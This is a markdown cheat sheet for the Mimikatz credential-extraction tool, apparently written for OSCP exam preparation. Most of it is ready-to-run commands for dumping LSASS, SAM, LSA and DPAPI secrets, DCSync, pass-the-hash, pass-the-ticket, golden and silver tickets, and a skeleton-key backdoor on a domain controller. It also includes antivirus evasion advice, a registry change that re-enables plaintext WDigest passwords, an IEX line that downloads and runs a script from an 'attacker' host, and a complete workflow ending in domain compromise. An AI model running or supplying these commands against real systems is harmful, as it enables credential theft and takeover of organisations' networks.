---
tags:
  - Windows
  - Credential_Access
  - Active_Directory
  - Mimikatz
  - Advanced
---

## Mimikatz
resources: [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz), [ADSecurity Mimikatz Guide](https://adsecurity.org/?page_id=1821), [HackTricks Mimikatz](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz)

> Comprehensive guide to Mimikatz - the ultimate Windows credential extraction and manipulation tool.

## What is Mimikatz?

> [!info] Mimikatz is a post-exploitation tool for extracting credentials from Windows systems.
> - Dumps plaintext passwords, hashes, and Kerberos tickets from memory
> - Performs pass-the-hash, pass-the-ticket, and golden/silver ticket attacks
> - Manipulates Windows authentication mechanisms
> - Requires administrator or SYSTEM privileges for most operations

## Basic Usage

### Start Mimikatz
```cmd
.\mimikatz.exe
```

### Enable Debug Privilege
```cmd
mimikatz # privilege::debug
```

> [!important] Always run `privilege::debug` first - required for most operations.

### One-Liner Execution
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

> [!tip] Use one-liners to avoid interactive sessions and save output to files.

### Save Output to File
```cmd
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > creds.txt
```

## Credential Dumping

### Dump All Credentials from LSASS
```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

> [!tip] This is the most common Mimikatz command - dumps all credentials in memory.

**Output includes:**
- Username and domain
- NTLM hash
- SHA1 hash
- Plaintext passwords (if WDigest is enabled)
- Kerberos tickets

### Dump WDigest Credentials
```cmd
mimikatz # sekurlsa::wdigest
```

> [!info] WDigest stores plaintext passwords in memory (disabled by default on Windows 8.1+).

### Dump Kerberos Tickets
```cmd
mimikatz # sekurlsa::tickets
```

### Dump Kerberos Encryption Keys
```cmd
mimikatz # sekurlsa::ekeys
```

> [!tip] Shows AES256, AES128, and RC4 keys for Kerberos authentication.

### Dump TGT (Ticket Granting Tickets)
```cmd
mimikatz # sekurlsa::tickets /export
```

> Exports all Kerberos tickets to `.kirbi` files in current directory.

## SAM Database Dumping

### Dump SAM Hashes
```cmd
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
```

> [!info] Extracts local user password hashes from SAM database.

### Dump SAM from Registry
```cmd
mimikatz # lsadump::sam /system:SYSTEM /sam:SAM
```

> Use when you have offline SAM and SYSTEM registry hives.

## LSA Secrets Dumping

### Dump LSA Secrets
```cmd
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::secrets
```

> [!info] LSA secrets contain:
> - Service account passwords
> - Auto-logon credentials
> - VPN credentials
> - Scheduled task passwords

### Dump Cached Domain Credentials
```cmd
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::cache
```

> [!info] Cached credentials allow domain users to log in when DC is unavailable.

## DPAPI (Data Protection API)

### Dump DPAPI Master Keys
```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::dpapi
```

> [!tip] DPAPI keys decrypt saved passwords in browsers, RDP credentials, etc.

### Dump Windows Vault Credentials
```cmd
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # vault::cred /patch
```

> [!info] Windows Vault stores credentials for:
> - Saved RDP sessions
> - Saved network passwords
> - Web credentials

## DCSync Attack

> [!warning] Requires Domain Admin, Domain Controller, or Replication permissions.

### DCSync Specific User
```cmd
mimikatz # lsadump::dcsync /domain:<Domain> /user:<Username>
```

**Example:**
```cmd
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
```

### DCSync krbtgt Account
```cmd
mimikatz # lsadump::dcsync /domain:<Domain> /user:krbtgt
```

> [!tip] krbtgt hash is needed for Golden Ticket attacks.

### DCSync All Users
```cmd
mimikatz # lsadump::dcsync /domain:<Domain> /all /csv
```

> [!warning] This dumps the entire domain - very noisy and slow.

### DCSync Computer Account
```cmd
mimikatz # lsadump::dcsync /domain:<Domain> /user:<ComputerName>$
```

> [!tip] Computer account hashes are needed for Silver Ticket attacks.

## Pass-the-Hash

### Pass-the-Hash with Mimikatz
```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:<Username> /domain:<Domain> /ntlm:<NTLMHash> /run:cmd.exe
```

**Example:**
```cmd
mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:cmd.exe
```

> [!info] Opens new command prompt with injected credentials.

### Pass-the-Hash with AES256 Key
```cmd
mimikatz # sekurlsa::pth /user:<Username> /domain:<Domain> /aes256:<AES256Key> /run:cmd.exe
```

> [!tip] AES keys are stealthier than NTLM hashes.

### Pass-the-Hash for Local Account
```cmd
mimikatz # sekurlsa::pth /user:Administrator /domain:. /ntlm:<NTLMHash> /run:cmd.exe
```

> [!info] Use `.` for local domain.

## Pass-the-Ticket

### Export All Tickets
```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

> Saves all tickets as `.kirbi` files.

### Inject Ticket into Current Session
```cmd
mimikatz # kerberos::ptt <ticket.kirbi>
```

**Example:**
```cmd
mimikatz # kerberos::ptt [0;3e7]-2-0-40e10000-Administrator@krbtgt-CORP.LOCAL.kirbi
```

### List Cached Tickets
```cmd
mimikatz # kerberos::list
```

### Purge All Tickets
```cmd
mimikatz # kerberos::purge
```

> [!tip] Clear tickets before injecting new ones.

## Golden Ticket Attack

> [!warning] Requires krbtgt hash (obtain via DCSync).

### Create and Inject Golden Ticket
```cmd
mimikatz # kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /krbtgt:<KrbtgtHash> /ptt
```

**Example:**
```cmd
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:a1b2c3d4e5f6... /ptt
```

### Save Golden Ticket to File
```cmd
mimikatz # kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /krbtgt:<KrbtgtHash> /ticket:golden.kirbi
```

### Golden Ticket with Custom User ID
```cmd
mimikatz # kerberos::golden /user:FakeAdmin /domain:<Domain> /sid:<DomainSID> /krbtgt:<KrbtgtHash> /id:500 /ptt
```

> [!info] ID 500 = default Administrator RID.

### Golden Ticket with Groups
```cmd
mimikatz # kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /krbtgt:<KrbtgtHash> /groups:512,513,518,519,520 /ptt
```

> [!tip] Add user to Domain Admins (512), Enterprise Admins (519), etc.

## Silver Ticket Attack

> [!info] Silver tickets target specific services instead of entire domain.

### Silver Ticket for CIFS (File Shares)
```cmd
mimikatz # kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /target:<TargetFQDN> /service:cifs /rc4:<ComputerHash> /ptt
```

### Silver Ticket for HTTP (WinRM)
```cmd
mimikatz # kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /target:<TargetFQDN> /service:http /rc4:<ComputerHash> /ptt
```

### Silver Ticket for HOST (Scheduled Tasks, WMI)
```cmd
mimikatz # kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /target:<TargetFQDN> /service:host /rc4:<ComputerHash> /ptt
```

### Silver Ticket for LDAP
```cmd
mimikatz # kerberos::golden /user:Administrator /domain:<Domain> /sid:<DomainSID> /target:<TargetFQDN> /service:ldap /rc4:<ComputerHash> /ptt
```

## Offline Credential Processing

### Process LSASS Dump File
```cmd
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

> [!tip] Analyze LSASS dumps offline to avoid detection.

### Process Multiple Dump Files
```cmd
mimikatz # sekurlsa::minidump lsass1.dmp
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::minidump lsass2.dmp
mimikatz # sekurlsa::logonpasswords
```

## Token Manipulation

### Elevate to SYSTEM
```cmd
mimikatz # privilege::debug
mimikatz # token::elevate
```

> [!info] Impersonates SYSTEM token for elevated operations.

### List Available Tokens
```cmd
mimikatz # token::list
```

### Impersonate Specific Token
```cmd
mimikatz # token::elevate /domainadmin
```

### Revert to Original Token
```cmd
mimikatz # token::revert
```

## Skeleton Key Attack

> [!warning] Injects backdoor into Domain Controller LSASS - all users can authenticate with "mimikatz" password.

### Inject Skeleton Key
```cmd
mimikatz # privilege::debug
mimikatz # misc::skeleton
```

### Use Skeleton Key
```cmd
# Map network share
net use \\DC01\C$ /user:Administrator mimikatz

# RDP to any machine
rdesktop <TargetIP> -u Administrator -p mimikatz -d <Domain>
```

> [!warning] Skeleton key is cleared on DC reboot.

## Trust Key Dumping

### Dump Domain Trust Keys
```cmd
mimikatz # privilege::debug
mimikatz # lsadump::trust /patch
```

> [!info] Trust keys enable inter-forest attacks.

### Dump Specific Trust
```cmd
mimikatz # lsadump::dcsync /domain:<Domain> /user:<TrustedDomain>$
```

## RDP Credential Theft

### Dump RDP Credentials
```cmd
mimikatz # privilege::debug
mimikatz # ts::mstsc
```

> [!info] Extracts credentials from mstsc.exe (Remote Desktop Client).

### Dump Terminal Services Sessions
```cmd
mimikatz # ts::sessions
```

## Kerberos Ticket Manipulation

### Request TGT for User
```cmd
mimikatz # kerberos::ask /target:<SPN>
```

### Request TGS for Service
```cmd
mimikatz # kerberos::ask /target:<SPN>
```

### Renew Ticket
```cmd
mimikatz # kerberos::renew
```

## Complete Credential Dump

### All-in-One Credential Extraction
```cmd
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "exit" > full_dump.txt
```

> [!tip] Comprehensive dump of all credentials on the system.

## Mimikatz Modules Reference

### privilege Module
- `privilege::debug` - Enable SeDebugPrivilege (required for most operations)

### sekurlsa Module (LSASS Manipulation)
- `sekurlsa::logonpasswords` - Dump all credentials from LSASS
- `sekurlsa::tickets` - List Kerberos tickets
- `sekurlsa::tickets /export` - Export tickets to files
- `sekurlsa::ekeys` - Dump Kerberos encryption keys
- `sekurlsa::dpapi` - Dump DPAPI master keys
- `sekurlsa::wdigest` - Dump WDigest credentials
- `sekurlsa::minidump <file>` - Load LSASS dump file
- `sekurlsa::pth` - Pass-the-hash attack

### lsadump Module (LSA/SAM Dumping)
- `lsadump::sam` - Dump SAM database
- `lsadump::secrets` - Dump LSA secrets
- `lsadump::cache` - Dump cached domain credentials
- `lsadump::dcsync` - DCSync attack (replicate DC data)
- `lsadump::trust` - Dump trust keys

### kerberos Module (Kerberos Attacks)
- `kerberos::list` - List cached Kerberos tickets
- `kerberos::ptt <ticket>` - Pass-the-ticket
- `kerberos::golden` - Create golden/silver tickets
- `kerberos::purge` - Clear all tickets

### token Module (Token Manipulation)
- `token::elevate` - Elevate to SYSTEM
- `token::list` - List available tokens
- `token::revert` - Revert to original token

### vault Module (Windows Vault)
- `vault::cred` - Dump Windows Vault credentials
- `vault::list` - List vault items

### misc Module (Miscellaneous)
- `misc::skeleton` - Inject skeleton key into DC

### ts Module (Terminal Services)
- `ts::mstsc` - Dump RDP credentials
- `ts::sessions` - List TS sessions

## Evasion and OpSec

### Avoid Detection
1. **Use offline dumps** - Dump LSASS with procdump, analyze offline
2. **Use Invoke-Mimikatz** - PowerShell version, runs in memory
3. **Obfuscate binary** - Rename mimikatz.exe, modify strings
4. **Use alternatives** - pypykatz (Python), SharpKatz (C#)

### Invoke-Mimikatz (PowerShell)
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
```

### pypykatz (Python Alternative)
```bash
# On Kali - parse LSASS dump
pypykatz lsa minidump lsass.dmp
```

## Troubleshooting

### "ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20)" Error
> [!warning] Not running as administrator.

**Solution:**
```cmd
# Run as administrator
runas /user:Administrator cmd.exe
```

### "ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)" Error
> [!warning] Antivirus or credential guard is blocking access.

**Solutions:**
- Disable antivirus temporarily
- Use alternative tools (pypykatz, SharpKatz)
- Dump LSASS with procdump and analyze offline

### No Plaintext Passwords Shown
> [!info] WDigest is disabled by default on Windows 8.1+.

**Solution:**
```cmd
# Enable WDigest (requires reboot and user re-login)
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

### "ERROR kull_m_process_getVeryBasicModuleInformations" Error
> [!info] Mimikatz version mismatch with Windows version.

**Solution:**
- Download latest Mimikatz from GitHub
- Use correct architecture (x86 vs x64)

## OSCP Exam Tips

> [!important] Mimikatz is essential for Windows privilege escalation and lateral movement.

**Time Estimate:** 2-5 minutes for credential dumping

**Quick Wins:**
1. **sekurlsa::logonpasswords** - First command to run after getting admin
2. **lsadump::sam** - Dump local hashes for offline cracking
3. **sekurlsa::tickets /export** - Export tickets for pass-the-ticket
4. **Save all output to files** - Use `> output.txt` for later analysis

**Common Mistakes:**
- Forgetting `privilege::debug` before other commands
- Not running as administrator
- Using wrong architecture (x86 vs x64)
- Not saving output to files

**Pro Tips:**
- Use one-liners to avoid interactive sessions
- Always save output to files for later analysis
- If Mimikatz is blocked, use pypykatz or dump LSASS offline
- Combine with NetExec for automated credential spraying
- Use DCSync instead of dumping NTDS.dit (faster, stealthier)

## Complete Attack Workflow

```cmd
# 1. Dump all credentials
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > creds.txt

# 2. Dump SAM hashes
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit" > sam.txt

# 3. Export Kerberos tickets
.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

# 4. DCSync domain (if DA)
.\mimikatz.exe "lsadump::dcsync /domain:corp.local /all /csv" "exit" > dcsync.txt

# 5. Pass-the-hash to other systems
.\mimikatz.exe "sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<hash> /run:cmd.exe"
```

> [!tip] This workflow goes from initial admin access to full domain compromise.
